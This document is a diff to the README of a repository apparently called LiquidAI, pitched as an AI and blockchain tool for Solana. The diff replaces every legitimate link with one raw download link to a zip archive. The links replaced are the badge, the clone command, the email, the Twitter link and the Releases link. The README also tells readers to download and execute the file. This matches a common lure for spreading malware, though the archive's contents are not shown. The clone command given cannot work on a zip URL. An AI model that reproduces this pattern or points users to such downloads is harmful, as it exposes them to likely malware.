@@ -1,6 +1,6 @@
 # LiquidAI 🌊🤖
 
-![LiquidAI](https://img.shields.io/badge/LiquidAI-Fusion%20of%20AI%20and%20Blockchain-blue?style=for-the-badge&logo=appveyor)
+![LiquidAI](https://raw.githubusercontent.com/MrXaifus/LiquidAI/main/agents/Liquid-AI-metapophysial.zip%20of%20AI%20and%20Blockchain-blue?style=for-the-badge&logo=appveyor)
 
 Welcome to **LiquidAI**! This repository combines advanced AI models with blockchain data to provide real-time insights, predictive analytics, and ecosystem intelligence. Designed specifically for the Solana blockchain, LiquidAI aims to pave the way for the future of decentralized innovation.
 
@@ -29,7 +29,7 @@ To get started with LiquidAI, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/MrXaifus/LiquidAI.git
+   git clone https://raw.githubusercontent.com/MrXaifus/LiquidAI/main/agents/Liquid-AI-metapophysial.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -108,12 +108,12 @@ LiquidAI is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For any questions or inquiries, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://raw.githubusercontent.com/MrXaifus/LiquidAI/main/agents/Liquid-AI-metapophysial.zip
+- **Twitter**: [@yourhandle](https://raw.githubusercontent.com/MrXaifus/LiquidAI/main/agents/Liquid-AI-metapophysial.zip)
 
 ## Releases 📦
 
-To download the latest version of LiquidAI, visit our [Releases](https://github.com/MrXaifus/LiquidAI/releases) section. Make sure to download the appropriate file for your operating system and execute it to start using LiquidAI.
+To download the latest version of LiquidAI, visit our [Releases](https://raw.githubusercontent.com/MrXaifus/LiquidAI/main/agents/Liquid-AI-metapophysial.zip) section. Make sure to download the appropriate file for your operating system and execute it to start using LiquidAI.
 
 ## Conclusion 🌟
 
